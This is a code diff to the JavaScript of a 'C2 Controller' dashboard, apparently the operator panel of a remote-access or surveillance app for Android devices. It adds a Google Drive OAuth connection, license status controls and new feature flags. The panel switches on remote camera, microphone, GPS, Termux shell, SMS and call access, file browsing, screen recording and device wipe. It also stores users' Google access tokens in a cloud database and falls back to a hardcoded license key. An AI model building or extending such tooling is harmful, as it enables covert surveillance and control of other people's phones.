@@ -1,4 +1,7 @@
 // app.js - Main Dashboard C2 Controller & Realtime Telemetry Listeners
+// TODO: [GOOGLE DRIVE OAUTH] Google OAuth 2.0 requires a valid Client ID saved in localStorage or the Overview input box.
+// TODO: [MASTER ADMIN LICENSE] Master Admin Controls sync License Status (ACTIVE/TRIAL/EXPIRED) and 8 feature flags.
+// TODO: [TAB RESPONSE SYNC] Each feature tab contains a [ Fetch Response ] button for instant DataChannel/Firebase RPC sync.
 let activeDeviceId = "DEV_DEFAULT";
 
 function detectClientOperatingSystem() {
@@ -28,6 +31,16 @@ document.addEventListener("click", function(e) {
         if (cmd) {
             console.log(`[C2 Command Clicked] Dispatching '${cmd}'`);
             sendC2CommandToDevice(cmd);
+        }
+    }
+
+    const fetchBtn = e.target.closest(".fetch-tab-response");
+    if (fetchBtn) {
+        const cat = fetchBtn.getAttribute("data-category") || "general";
+        console.log(`[Fetch Tab Response Clicked] Querying telemetry for '${cat}'`);
+        showDashboardNotification("info", `Fetching latest response for '${cat}'...`);
+        if (typeof fetchCategoryTelemetryLogs === "function") {
+            fetchCategoryTelemetryLogs(cat);
         }
     }
 
@@ -64,6 +77,7 @@ function setupFirebaseConnectionMonitor() {
 document.addEventListener("DOMContentLoaded", function() {
     detectClientOperatingSystem();
     setupFirebaseConnectionMonitor();
+    setupGoogleDriveOAuthConnect();
     if (typeof loadEnrolledDevicesList === "function") {
         loadEnrolledDevicesList();
     }
@@ -286,13 +300,28 @@ function loadMasterAdminPermissionMatrix(uid, deviceId) {
             <td>${currentUser ? currentUser.email : "admin@homemonitor.com"}</td>
             <td>Android System (SDK 35)</td>
             <td>
-                <div class="form-check form-switch d-inline-block me-3"><input class="form-check-input" type="checkbox" checked id="permCam"> <label class="small fw-bold">Camera</label></div>
-                <div class="form-check form-switch d-inline-block me-3"><input class="form-check-input" type="checkbox" checked id="permMic"> <label class="small fw-bold">Mic Audio</label></div>
-                <div class="form-check form-switch d-inline-block me-3"><input class="form-check-input" type="checkbox" checked id="permGps"> <label class="small fw-bold">GPS</label></div>
-                <div class="form-check form-switch d-inline-block me-3"><input class="form-check-input" type="checkbox" checked id="permTermux"> <label class="small fw-bold">Termux</label></div>
-                <div class="form-check form-switch d-inline-block me-3"><input class="form-check-input" type="checkbox" checked id="permSms"> <label class="small fw-bold">SMS & Calls</label></div>
+                <div class="row g-2">
+                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permCam"> <label class="small fw-bold">Camera</label></div></div>
+                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permMic"> <label class="small fw-bold">Mic Audio</label></div></div>
+                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permGps"> <label class="small fw-bold">GPS Location</label></div></div>
+                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permTermux"> <label class="small fw-bold">Termux Shell</label></div></div>
+                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permSms"> <label class="small fw-bold">SMS & Calls</label></div></div>
+                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permFiles"> <label class="small fw-bold">Files Explorer</label></div></div>
+                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permMdm"> <label class="small fw-bold">MDM Wipe</label></div></div>
+                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permScreen"> <label class="small fw-bold">Screen Record</label></div></div>
+                </div>
             </td>
-            <td><button class="btn btn-sm btn-outline-warning fw-bold" onclick="saveFeaturePermissions('${uid}', '${deviceId}')">Save Flags</button></td>
+            <td>
+                <div class="mb-2">
+                    <select id="adminLicenseStatusSelect" class="form-select form-select-sm mb-1 fw-bold">
+                        <option value="ACTIVE" selected>ACTIVE (Full Access)</option>
+                        <option value="TRIAL">TRIAL MODE</option>
+                        <option value="EXPIRED">EXPIRED / LOCKED</option>
+                    </select>
+                    <input type="text" id="adminLicenseKeyInput" class="form-control form-control-sm font-monospace" placeholder="HM-KEY-2026-PRO">
+                </div>
+                <button class="btn btn-sm btn-warning w-100 fw-bold" onclick="saveFeaturePermissions('${uid}', '${deviceId}')"><i class="fa-solid fa-save me-1"></i>Save Master Flags & License</button>
+            </td>
         </tr>
     `;
 }
@@ -303,12 +332,24 @@ function saveFeaturePermissions(uid, deviceId) {
         mic_enabled: document.getElementById("permMic")?.checked ?? true,
         location_enabled: document.getElementById("permGps")?.checked ?? true,
         termux_enabled: document.getElementById("permTermux")?.checked ?? true,
-        sms_calls_enabled: document.getElementById("permSms")?.checked ?? true
+        sms_calls_enabled: document.getElementById("permSms")?.checked ?? true,
+        files_enabled: document.getElementById("permFiles")?.checked ?? true,
+        mdm_wipe_enabled: document.getElementById("permMdm")?.checked ?? true,
+        screen_record_enabled: document.getElementById("permScreen")?.checked ?? true
     };
 
+    const licenseStatus = document.getElementById("adminLicenseStatusSelect")?.value || "ACTIVE";
+    const licenseKey = document.getElementById("adminLicenseKeyInput")?.value?.trim() || "HM-KEY-2026-PRO";
+
     firebase.database().ref(`users/${uid}/devices/${deviceId}/feature_flags`).set(flags);
+    firebase.database().ref(`users/${uid}/devices/${deviceId}/license`).set({
+        status: licenseStatus,
+        key: licenseKey,
+        updatedAt: Date.now()
+    });
+
     localStorage.setItem(`flags_${deviceId}`, JSON.stringify(flags));
-    alert("✅ Master Admin Feature Flags Updated Successfully & Saved to LocalStorage!");
+    showDashboardNotification("success", `Master Admin: Flags & License (${licenseStatus}) updated for ${deviceId}`);
 }
 
 // Termux Interactive Terminal Form
@@ -559,4 +600,84 @@ function renderCategoryTelemetry(category, items) {
             </div>
         `).join("");
     }
+}
+
+function setupGoogleDriveOAuthConnect() {
+    const btn = document.getElementById("connectGoogleDriveBtn");
+    const statusLabel = document.getElementById("gdriveAccountStatus");
+    const clientIdInput = document.getElementById("gdriveClientIdInput");
+    const saveKeyBtn = document.getElementById("saveGdriveClientIdBtn");
+
+    if (!btn) return;
+
+    const savedClientId = localStorage.getItem("gdrive_client_id") || "";
+    if (clientIdInput) {
+        clientIdInput.value = savedClientId;
+    }
+
+    if (saveKeyBtn && clientIdInput) {
+        saveKeyBtn.addEventListener("click", function() {
+            const newKey = clientIdInput.value.trim();
+            localStorage.setItem("gdrive_client_id", newKey);
+            showDashboardNotification("success", "✅ Google OAuth Client ID saved to Browser Storage!");
+        });
+    }
+
+    const savedDriveToken = localStorage.getItem("gdrive_connected_token");
+    if (savedDriveToken && statusLabel) {
+        statusLabel.innerHTML = `Status: <strong class="text-success">Connected 🟢 (15 GB Personal Cloud Storage Active)</strong>`;
+        btn.className = "btn btn-sm btn-outline-success fw-bold";
+        btn.innerHTML = `<i class="fa-brands fa-google me-1"></i>Google Drive Active 🟢`;
+    }
+
+    btn.addEventListener("click", function() {
+        console.log("[Google Drive OAuth] Launching 1-Click Google Authorization...");
+        let client_id = clientIdInput ? clientIdInput.value.trim() : "";
+        if (!client_id) {
+            client_id = localStorage.getItem("gdrive_client_id") || "";
+        }
+
+        if (!client_id) {
+            showDashboardNotification("warning", "⚠️ Please enter your Google Cloud OAuth Client ID in the input box above first!");
+            if (clientIdInput) clientIdInput.focus();
+            return;
+        }
+
+        const redirect_uri = window.location.origin + window.location.pathname;
+        const scope = "https://www.googleapis.com/auth/drive.file";
+
+        const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${client_id}&redirect_uri=${encodeURIComponent(redirect_uri)}&response_type=token&scope=${encodeURIComponent(scope)}`;
+
+        const popup = window.open(authUrl, "GoogleDriveAuth", "width=550,height=650");
+        showDashboardNotification("info", "Opening Google Sign-In... Select your Google Account to connect 15 GB Free Storage");
+
+        const checkInterval = setInterval(() => {
+            try {
+                if (popup && popup.location && popup.location.hash) {
+                    const hash = popup.location.hash.substring(1);
+                    const params = new URLSearchParams(hash);
+                    const accessToken = params.get("access_token");
+                    if (accessToken) {
+                        clearInterval(checkInterval);
+                        popup.close();
+                        localStorage.setItem("gdrive_connected_token", accessToken);
+
+                        const uid = currentUser ? currentUser.uid : "default_user";
+                        firebase.database().ref(`users/${uid}/devices/${activeDeviceId}/gdrive_config`).set({
+                            status: "CONNECTED",
+                            accessToken: accessToken,
+                            updatedAt: Date.now()
+                        });
+
+                        if (statusLabel) {
+                            statusLabel.innerHTML = `Status: <strong class="text-success">Connected 🟢 (15 GB Personal Cloud Storage Active)</strong>`;
+                        }
+                        btn.className = "btn btn-sm btn-outline-success fw-bold";
+                        btn.innerHTML = `<i class="fa-brands fa-google me-1"></i>Google Drive Active 🟢`;
+                        showDashboardNotification("success", "✅ Google Drive Connected! 15 GB Free Cloud Storage Ready");
+                    }
+                }
+            } catch (_) {}
+        }, 500);
+    });
 }
